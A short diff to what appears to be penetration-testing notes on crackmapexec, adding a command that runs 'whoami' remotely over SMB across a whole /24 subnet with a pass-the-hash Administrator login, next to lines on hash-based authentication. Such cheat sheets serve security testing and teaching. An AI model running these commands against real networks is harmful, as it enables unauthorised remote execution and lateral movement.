@@ -66,6 +66,9 @@ crackmapexec smb $ip --local-auth -u <username> -p <password> -d <DOMAIN> --logg
 
 # Using a hash instead of a password, to authenticate ourselves
 crackmapexec smb $ip -u <username> -H <hash> -d <DOMAIN>
+
+# Execute commands with flag -x
+crackmapexec smb $ip/24 -u <Administrator> -d . -H <hash> -x whoami
 ```
 
 ## Basic technique
